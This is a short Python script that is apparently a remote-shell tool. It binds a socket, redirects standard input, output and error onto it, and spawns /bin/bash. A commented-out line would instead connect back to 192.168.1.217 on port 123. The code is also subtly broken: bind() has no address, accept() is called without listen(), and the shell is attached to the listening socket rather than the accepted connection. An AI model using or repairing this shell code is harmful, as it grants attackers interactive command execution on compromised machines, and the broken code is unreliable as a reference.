#!/usr/bin/python

import sys
import socket

shell = '/bin/bash'


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind()
        #s.connect((socket.gethostbyname('192.168.1.217'), int(123)))
        s.accept()
        print('[+]Connect OK')
    except BaseException as ex:
        print(ex)
        print("[-]Can't connect")
        sys.exit(2)
    import os
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    import pty
    global shell
    print('Create shell success')
    pty.spawn(shell)
    s.close()


if __name__ == '__main__':
    main()